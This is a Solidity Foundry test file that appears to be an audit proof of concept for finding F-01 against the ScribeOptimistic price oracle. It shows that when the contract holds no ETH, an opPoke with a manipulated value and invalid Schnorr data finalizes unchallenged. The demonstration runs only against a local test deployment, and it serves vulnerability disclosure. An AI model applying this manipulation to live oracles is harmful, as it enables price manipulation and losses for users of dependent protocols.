// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {console2} from "forge-std/console2.sol";

import {IScribe} from "src/IScribe.sol";
import {IScribeOptimistic} from "src/IScribeOptimistic.sol";
import {ScribeOptimistic} from "src/ScribeOptimistic.sol";

import {LibSecp256k1} from "src/libs/LibSecp256k1.sol";
import {LibFeed} from "script/libs/LibFeed.sol";

import {IToll} from "chronicle-std/toll/IToll.sol";

import {Test} from "forge-std/Test.sol";

/// @title PoC: F-01 Zero contract balance disables challenge incentive
/// @notice Demonstrates that with 0 ETH balance, challengeReward() returns 0,
///         meaning no economic incentive to challenge a manipulated opPoke.
contract POC_F01 is Test {
    using LibSecp256k1 for LibSecp256k1.Point;
    using LibFeed for LibFeed.Feed;
    using LibFeed for LibFeed.Feed[];

    ScribeOptimistic private opScribe;
    LibFeed.Feed[] private feeds;

    function setUp() public {
        opScribe = new ScribeOptimistic(address(this), "ETH/USD");
        IToll(address(opScribe)).kiss(address(this));
        feeds = _liftFeeds(opScribe.bar());
    }

    function test_zero_balance_challenge_reward_is_zero() public {
        // Verify contract has 0 balance
        assertEq(address(opScribe).balance, 0);
        console2.log("Contract balance:", address(opScribe).balance);

        // Verify challengeReward returns 0
        assertEq(opScribe.challengeReward(), 0);
        console2.log("Challenge reward:", opScribe.challengeReward());
        console2.log("PASS: challengeReward() = 0 when balance = 0");
    }

    function test_zero_balance_opPoke_finalizes_without_challenge() public {
        // Step 1: Initial poke to set a value
        uint128 val1 = 1000;
        IScribe.PokeData memory pokeData1;
        pokeData1.val = val1;
        pokeData1.age = uint32(block.timestamp);
        IScribe.SchnorrData memory schnorr1 =
            feeds.signSchnorr(opScribe.constructPokeMessage(pokeData1));
        opScribe.poke(pokeData1, schnorr1);

        assertEq(opScribe.read(), val1);
        console2.log("Step 1: Initial poke, val =", val1);

        // Advance time so opPoke is not stale
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);

        // Step 2: Submit opPoke with manipulated value using valid feed ECDSA
        // but invalid Schnorr data (garbage schnorr that won't verify)
        uint128 manipulatedVal = 999999;
        IScribe.PokeData memory pokeData2;
        pokeData2.val = manipulatedVal;
        pokeData2.age = uint32(block.timestamp);

        // Craft invalid Schnorr data (garbage that won't verify)
        IScribe.SchnorrData memory fakeSchnorr = IScribe.SchnorrData({
            signature: bytes32(uint(0xdeadbeef)),
            commitment: address(0x1),
            feedIds: abi.encodePacked(feeds[0].id)
        });

        // Sign opPoke message with valid feed ECDSA
        IScribe.ECDSAData memory ecdsaData =
            feeds[0].signECDSA(opScribe.constructOpPokeMessage(pokeData2, fakeSchnorr));

        opScribe.opPoke(pokeData2, fakeSchnorr, ecdsaData);
        console2.log("Step 2: opPoke submitted with manipulated value =", manipulatedVal);

        // Step 3: Verify no incentive to challenge
        assertEq(opScribe.challengeReward(), 0);
        console2.log("Step 3: challengeReward() =", opScribe.challengeReward(), "(no incentive!)");

        // Step 4: Warp past challenge period
        vm.warp(block.timestamp + opScribe.opChallengePeriod() + 1);

        // Step 5: Oracle now returns manipulated value via _currentPokeData()
        (bool ok, uint val) = opScribe.tryRead();
        assertTrue(ok);
        assertEq(val, manipulatedVal);
        console2.log("Step 5: tryRead() returns manipulated value =", val);
        console2.log("PASS: Zero balance allows unchallenged manipulation to finalize");
    }

    function _liftFeeds(uint8 numberFeeds)
        internal
        returns (LibFeed.Feed[] memory)
    {
        LibFeed.Feed[] memory feeds_ = new LibFeed.Feed[](uint(numberFeeds));
        uint privKey = 2;
        uint bloom;
        uint ctr;
        while (ctr != numberFeeds) {
            LibFeed.Feed memory feed = LibFeed.newFeed({privKey: privKey});
            if (bloom & (1 << feed.id) == 0) {
                bloom |= 1 << feed.id;
                feeds_[ctr++] = feed;
                opScribe.lift(
                    feed.pubKey,
                    feed.signECDSA(opScribe.feedRegistrationMessage())
                );
            }
            privKey++;
        }
        return feeds_;
    }
}
